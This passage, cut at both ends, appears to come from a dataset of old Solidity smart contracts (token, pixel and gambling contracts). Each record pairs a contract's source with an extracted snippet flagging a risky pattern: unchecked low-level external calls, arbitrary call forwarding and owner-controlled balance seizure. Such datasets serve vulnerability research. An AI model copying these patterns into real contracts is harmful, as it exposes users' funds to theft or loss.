* getBankroll())/10000;\n return ((netPotentialPayout <= maxAllowedPayout) && (_amountWagered >= minBet));\n }\n modifier onlyIfEnoughFunds(bytes32 myid) {\n if (isValidSize(spins[myid].amountWagered)) {\n _;\n }\n else {\n safeSend(spins[myid].playerAddress, spins[myid].amountWagered);\n delete spins[myid];\n return;\n }\n }\n modifier onlyLessThanMaxSpins (uint _nSpins) {\n assert(_nSpins <= MAX_SPINS);\n _;\n }\n modifier onlyIfFair(uint[] _prob, uint[] _payouts) {\n if (_prob.length != _payouts.length) revert();\n uint sum = 0;\n for (uint i = 0; i <_prob.length; i++) {\n sum += _prob[i] * _payouts[i];\n }\n assert(sum == 10000);\n _;\n }\n function()\n payable {\n buySpins(1);\n }\n function buySpins(uint _nSpins)\n payable\n onlyLessThanMaxSpins(_nSpins)\n onlyIfNotStopped {\n uint gas = _nSpins*ORACLIZE_PER_SPIN_GAS_LIMIT + ORACLIZE_BASE_GAS_LIMIT + safeGas;\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"random\", gas);\n if (oraclizeFee/multipliers[0] + oraclizeFee >= msg.value) revert();\n uint amountWagered = msg.value - oraclizeFee;\n uint maxNetPotentialPayout = (amountWagered * (10000 - INVESTORS_EDGE) * multipliers[0])/10000;\n uint maxAllowedPayout = (CAPITAL_RISK * getBankroll())/10000;\n if ((maxNetPotentialPayout <= maxAllowedPayout) && (amountWagered >= minBet)) {\n bytes32 queryId = oraclize_newRandomDSQuery(0, 2*_nSpins, gas);\n spins[queryId] =\n SpinsContainer(msg.sender,\n _nSpins,\n amountWagered\n );\n LOG_newSpinsContainer(queryId, msg.sender, amountWagered, _nSpins);\n totalAmountWagered += amountWagered;\n } else {\n revert();\n }\n }\n function executeSpins(bytes32 myid, bytes randomBytes)\n private\n returns(uint)\n {\n uint amountWon = 0;\n uint numberDrawn = 0;\n uint rangeUpperEnd = 0;\n uint nSpins = spins[myid].nSpins;\n for (uint i = 0; i < 2*nSpins; i += 2) {\n numberDrawn = ((uint(randomBytes[i])*256 + uint(randomBytes[i+1]))*10000)/2**16;\n rangeUpperEnd = 0;\n LOG_SpinExecuted(myid, spins[myid].playerAddress, i/2, numberDrawn);\n for (uint j = 0; j < probabilities.length; j++) {\n rangeUpperEnd += probabilities[j];\n if (numberDrawn < rangeUpperEnd) {\n amountWon += (spins[myid].amountWagered * multipliers[j]) / nSpins;\n break;\n }\n }\n }\n return amountWon;\n }\n function sendPayout(bytes32 myid, uint payout) private {\n if (payout >= spins[myid].amountWagered) {\n investorsLosses += sub(payout, spins[myid].amountWagered);\n payout = (payout*(10000 - INVESTORS_EDGE))/10000;\n }\n else {\n uint tempProfit = add(investorsProfit, sub(spins[myid].amountWagered, payout));\n investorsProfit += (sub(spins[myid].amountWagered, payout)*(10000 - HOUSE_EDGE))/10000;\n safeSend(houseAddress, sub(tempProfit, investorsProfit));\n }\n LOG_SpinsContainerInfo(myid, spins[myid].playerAddress, payout);\n safeSend(spins[myid].playerAddress, payout);\n }\n function __callback(bytes32 myid, string result, bytes _proof)\n onlyOraclize\n onlyIfSpinsExist(myid)\n onlyIfEnoughFunds(myid)\n oraclize_randomDS_proofVerify(myid, result, _proof)\n {\n uint payout = executeSpins(myid, bytes(result));\n sendPayout(myid, payout);\n delete profitDistributed;\n delete spins[myid];\n }\n function setConfiguration(uint[] _probabilities, uint[] _multipliers)\n onlyOwner\n onlyIfFair(_probabilities, _multipliers) {\n oraclize_setProof(proofType_Ledger);\n delete probabilities;\n delete multipliers;\n uint lastProbability = 0;\n uint lastMultiplier = 2**256 - 1;\n for (uint i = 0; i < _probabilities.length; i++) {\n probabilities.push(_probabilities[i]);\n if (lastProbability >= _probabilities[i]) revert();\n lastProbability = _probabilities[i];\n }\n for (i = 0; i < _multipliers.length; i++) {\n multipliers.push(_multipliers[i]);\n if (lastMultiplier <= _multipliers[i]) revert();\n lastMultiplier = _multipliers[i];\n }\n }\n function setMinBet(uint _minBet) onlyOwner {\n minBet = _minBet;\n }\n function getSpinsContainer(bytes32 myid)\n constant\n returns(address, uint) {\n return (spins[myid].playerAddress, spins[myid].amountWagered);\n }\n function getMinAmountToWager(uint _nSpins)\n onlyLessThanMaxSpins(_nSpins)\n constant\n returns(uint) {\n uint gas = _nSpins*ORACLIZE_PER_SPIN_GAS_LIMIT + ORACLIZE_BASE_GAS_LIMIT + safeGas;\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"random\", gas);\n return minBet + oraclizeFee/multipliers[0] + oraclizeFee;\n }\n function getMaxAmountToWager(uint _nSpins)\n onlyLessThanMaxSpins(_nSpins)\n constant\n returns(uint) {\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"random\", _nSpins*ORACLIZE_PER_SPIN_GAS_LIMIT + ORACLIZE_BASE_GAS_LIMIT + safeGas);\n uint maxWage = (CAPITAL_RISK * getBankroll())*10000/((10000 - INVESTORS_EDGE)*10000*multipliers[0]);\n return maxWage + oraclizeFee;\n }\n}",
  "extract_feature": [
    "function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\nbool ret;\naddress addr;\nassembly {\nlet size := mload(0x40)\nmstore(size, hash)\nmstore(add(size, 32), v)\nmstore(add(size, 64), r)\nmstore(add(size, 96), s)\nret := call(3000, 1, 0, size, 128, size, 32)\naddr := mload(size)\n}\nreturn (ret, addr);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1629"
  },
  "filename": "39068.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Owned {\n address public owner;\n function changeOwner(address _addr) onlyOwner {\n if (_addr == 0x0) throw;\n owner = _addr;\n }\n modifier onlyOwner {\n if (msg.sender != owner) throw;\n _;\n }\n}\ncontract Mutex is Owned {\n bool locked = false;\n modifier mutexed {\n if (locked) throw;\n locked = true;\n _;\n locked = false;\n }\n function unMutex() onlyOwner {\n locked = false;\n }\n}\ncontract Rental is Owned {\n function Rental(address _owner) {\n if (_owner == 0x0) throw;\n owner = _owner;\n }\n function offer(address from, uint num) {\n }\n function claimBalance(address) returns(uint) {\n return 0;\n }\n function exec(address dest) onlyOwner {\n if (!dest.call(msg.data)) throw;\n }\n}\ncontract Token is Owned, Mutex {\n uint ONE = 10**8;\n uint price = 5000;\n Ledger ledger;\n Rental rentalContract;\n uint8 rollOverTime = 4;\n uint8 startTime = 8;\n bool live = false;\n address club;\n uint lockedSupply = 0;\n string public name = \"Legends\";\n uint8 public decimals = 8;\n string public symbol = \"LGD\";\n string public version = '1.1';\n bool transfersOn = false;\n modifier onlyInputWords(uint n) {\n if (msg.data.length != (32 * n) + 4) throw;\n _;\n }\n function Token() {\n owner = msg.sender;\n }\n event LedgerUpdated(address,address);\n function changeClub(address _addr) onlyOwner {\n if (_addr == 0x0) throw;\n club = _addr;\n }\n function changePrice(uint _num) onlyOwner {\n price = _num;\n }\n function safeAdd(uint a, uint b) returns (uint) {\n if ((a + b) < a) throw;\n return (a + b);\n }\n function changeLedger(address _addr) onlyOwner {\n if (_addr == 0x0) throw;\n LedgerUpdated(msg.sender, _addr);\n ledger = Ledger(_addr);\n }\n function changeRental(address _addr) onlyOwner {\n if (_addr == 0x0) throw;\n rentalContract = Rental(_addr);\n }\n function changeTimes(uint8 _rollOver, uint8 _start) onlyOwner {\n rollOverTime = _rollOver;\n startTime = _start;\n }\n function lock(address _seizeAddr) onlyOwner mutexed {\n uint myBalance = ledger.balanceOf(_seizeAddr);\n lockedSupply += myBalance;\n ledger.setBalance(_seizeAddr, 0);\n }\n event Dilution(address, uint);\n function dilute(address _destAddr, uint amount) onlyOwner {\n if (amount > lockedSupply) throw;\n Dilution(_destAddr, amount);\n lockedSupply -= amount;\n uint curBalance = ledger.balanceOf(_destAddr);\n curBalance = safeAdd(amount, curBalance);\n ledger.setBalance(_destAddr, curBalance);\n }\n function completeCrowdsale() onlyOwner {\n transfersOn = true;\n lock(owner);\n }\n function pauseTransfers() onlyOwner {\n transfersOn = false;\n }\n function resumeTransfers() onlyOwner {\n transfersOn = true;\n }\n function rentOut(uint num) {\n if (ledger.balanceOf(msg.sender) < num) throw;\n rentalContract.offer(msg.sender, num);\n ledger.tokenTransfer(msg.sender, rentalContract, num);\n }\n function claimUnrented() {\n uint amount = rentalContract.claimBalance(msg.sender);\n ledger.tokenTransfer(rentalContract, msg.sender, amount);\n }\n function burn(uint _amount) {\n uint balance = ledger.balanceOf(msg.sender);\n if (_amount > balance) throw;\n ledger.setBalance(msg.sender, balance - _amount);\n }\n function checkIn(uint _numCheckins) returns(bool) {\n int needed = int(price * ONE* _numCheckins);\n if (int(ledger.balanceOf(msg.sender)) > needed) {\n ledger.changeUsed(msg.sender, needed);\n return true;\n }\n return false;\n }\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n function totalSupply() constant returns(uint) {\n return ledger.totalSupply();\n }\n function transfer(address _to, uint _amount) onlyInputWords(2) returns(bool) {\n if (!transfersOn && msg.sender != owner) return false;\n if (!ledger.tokenTransfer(msg.sender, _to, _amount)) { return false; }\n Transfer(msg.sender, _to, _amount);\n return true;\n }\n function transferFrom(address _from, address _to, uint _amount) onlyInputWords(3) returns (bool) {\n if (!transfersOn && msg.sender != owner) return false;\n if (! ledger.tokenTransferFrom(msg.sender, _from, _to, _amount) ) { return false;}\n Transfer(msg.sender, _to, _amount);\n return true;\n }\n function allowance(address _from, address _to) constant returns(uint) {\n return ledger.allowance(_from, _to);\n }\n function approve(address _spender, uint _value) returns (bool) {\n if ( ledger.tokenApprove(msg.sender, _spender, _value) ) {\n Approval(msg.sender, _spender, _value);\n return true;\n }\n return false;\n }\n function balanceOf(address _addr) constant returns(uint) {\n return ledger.balanceOf(_addr);\n }\n}\ncontract Ledger is Owned {\n uint ONE = 10**8;\n uint preMined = 30000000;\n mapping (address => uint) balances;\n mapping (address => uint) usedToday;\n mapping (address => bool) seenHere;\n address[] public seenHereA;\n mapping (address => mapping (address => uint256)) allowed;\n address token;\n uint public totalSupply = 0;\n function Ledger() {\n owner = msg.sender;\n seenHere[owner] = true;\n seenHereA.push(owner);\n totalSupply = preMined *ONE;\n balances[owner] = totalSupply;\n }\n modifier onlyToken {\n if (msg.sender != token) throw;\n _;\n }\n modifier onlyTokenOrOwner {\n if (msg.sender != token && msg.sender != owner) throw;\n _;\n }\n function tokenTransfer(address _from, address _to, uint amount) onlyToken returns(bool) {\n if (amount > balances[_from]) return false;\n if ((balances[_to] + amount) < balances[_to]) return false;\n if (amount == 0) { return false; }\n balances[_from] -= amount;\n balances[_to] += amount;\n if (seenHere[_to] == false) {\n seenHereA.push(_to);\n seenHere[_to] = true;\n }\n return true;\n }\n function tokenTransferFrom(address _sender, address _from, address _to, uint amount) onlyToken returns(bool) {\n if (allowed[_from][_sender] <= amount) return false;\n if (amount > balanceOf(_from)) return false;\n if (amount == 0) return false;\n if ((balances[_to] + amount) < amount) return false;\n balances[_from] -= amount;\n balances[_to] += amount;\n allowed[_from][_sender] -= amount;\n if (seenHere[_to] == false) {\n seenHereA.push(_to);\n seenHere[_to] = true;\n }\n return true;\n }\n function changeUsed(address _addr, int amount) onlyToken {\n int myToday = int(usedToday[_addr]) + amount;\n usedToday[_addr] = uint(myToday);\n }\n function resetUsedToday(uint8 startI, uint8 numTimes) onlyTokenOrOwner returns(uint8) {\n uint8 numDeleted;\n for (uint i = 0; i < numTimes && i + startI < seenHereA.length; i++) {\n if (usedToday[seenHereA[i+startI]] != 0) {\n delete usedToday[seenHereA[i+startI]];\n numDeleted++;\n }\n }\n return numDeleted;\n }\n function balanceOf(address _addr) constant returns (uint) {\n if (usedToday[_addr] >= balances[_addr]) { return 0;}\n return balances[_addr] - usedToday[_addr];\n }\n event Approval(address, address, uint);\n function tokenApprove(address _from, address _spender, uint256 _value) onlyToken returns (bool) {\n allowed[_from][_spender] = _value;\n Approval(_from, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function changeToken(address _token) onlyOwner {\n token = Token(_token);\n }\n function reduceTotalSupply(uint amount) onlyToken {\n if (amount > totalSupply) throw;\n totalSupply -= amount;\n }\n function setBalance(address _addr, uint amount) onlyTokenOrOwner {\n if (balances[_addr] == amount) { return; }\n if (balances[_addr] < amount) {\n uint increase = amount - balances[_addr];\n totalSupply += increase;\n } else {\n uint decrease = balances[_addr] - amount;\n totalSupply -= decrease;\n }\n balances[_addr] = amount;\n }\n}",
  "extract_feature": [
    "function exec(address dest) onlyOwner {\nif (!dest.call(msg.data)) throw;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb162a"
  },
  "filename": "39079.sol",
  "content": "pragma solidity ^0.4.10;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\ncontract Owned {\n address owner;\n bool frozen = false;\n function Owned() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n modifier publicMethod() {\n require(!frozen);\n _;\n }\n function drain() onlyOwner {\n owner.transfer(this.balance);\n }\n function freeze() onlyOwner {\n frozen = true;\n }\n function unfreeze() onlyOwner {\n frozen = false;\n }\n function destroy() onlyOwner {\n selfdestruct(owner);\n }\n}\ncontract Pixel is Owned, HumanStandardToken {\n uint32 public size = 1000;\n uint32 public size2 = size*size;\n mapping (uint32 => uint24) public pixels;\n mapping (uint32 => address) public owners;\n event Set(address indexed _from, uint32[] _xys, uint24[] _rgbs);\n event Unset(address indexed _from, uint32[] _xys);\n function Pixel() HumanStandardToken(size2, \"Pixel\", 0, \"PXL\") {\n }\n function set(uint32[] _xys, uint24[] _rgbs) publicMethod() {\n address _from = msg.sender;\n require(_xys.length == _rgbs.length);\n require(balances[_from] >= _xys.length);\n uint32 _xy; uint24 _rgb;\n for (uint i = 0; i < _xys.length; i++) {\n _xy = _xys[i];\n _rgb = _rgbs[i];\n require(_xy < size2);\n require(owners[_xy] == 0);\n owners[_xy] = _from;\n pixels[_xy] = _rgb;\n }\n balances[_from] -= _xys.length;\n Set(_from, _xys, _rgbs);\n }\n function unset(uint32[] _xys) publicMethod() {\n address _from = msg.sender;\n uint32 _xy;\n for (uint i = 0; i < _xys.length; i++) {\n _xy = _xys[i];\n require(owners[_xy] == _from);\n balances[_from] += 1;\n owners[_xy] = 0;\n pixels[_xy] = 0;\n }\n Unset(_from, _xys);\n }\n function row(uint32 _y) constant returns (uint24[1000], address[1000]) {\n uint32 _start = _y * size;\n uint24[1000] memory rgbs;\n address[1000] memory addrs;\n for (uint32 i = 0; i < 1000; i++) {\n rgbs[i] = pixels[_start + i];\n addrs[i] = owners[_start + i];\n }\n return (rgbs, addrs);\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb162b"
  },
  "filename": "39113.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken() {\n balances[msg.sender] = 10000000000000;\n totalSupply = 10000000000000;\n name = 'Billy Coin';\n decimals = 4;\n symbol = 'BILLY';\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb162c"
  },
  "filename": "39147.sol",
  "content": "pragma solidity ^0.4.11;\npragma solidity ^0.4.0;\ncontract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) payable returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) payable returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) payable returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) payable returns (bytes32 _id);\n function queryN(uint _timestamp, string _datasource, bytes _argN) payable returns (bytes32 _id);\n function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) payable returns (bytes32 _id);\n function getPrice(string _datasource) returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);\n function useCoupon(string _coupon);\n function setProofType(byte _proofType);\n function setConfig(bytes32 _config);\n function setCustomGasPrice(uint _gasPrice);\n function randomDS_getSessionPubKeyHash() returns(bytes32);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofType_Android = 0x20;\n byte constant proofType_Ledger = 0x30;\n byte constant proofType_Native = 0xF0;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n if((address(OAR)==0)||(getCodeSize(address(OAR))==0)) oraclize_setNetwork(networkID_auto);\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n oraclize.useCoupon(code);\n _;\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);\n oraclize_setNetworkName(\"eth_mainnet\");\n return true;\n }\n if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1)>0){\n OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);\n oraclize_setNetworkName(\"eth_ropsten3\");\n return true;\n }\n if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e)>0){\n OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);\n oraclize_setNetworkName(\"eth_kovan\");\n return true;\n }\n if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48)>0){\n OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);\n oraclize_setNetworkName(\"eth_rinkeby\");\n return true;\n }\n if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475)>0){\n OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);\n return true;\n }\n if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF)>0){\n OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);\n return true;\n }\n if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA)>0){\n OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);\n return true;\n }\n return false;\n }\n function __callback(bytes32 myid, string result) {\n __callback(myid, result, new bytes(0));\n }\n function __callback(bytes32 myid, string result, bytes proof) {\n }\n function oraclize_useCoupon(string code) oraclizeAPI internal {\n oraclize.useCoupon(code);\n }\n function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource);\n }\n function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource, gaslimit);\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = 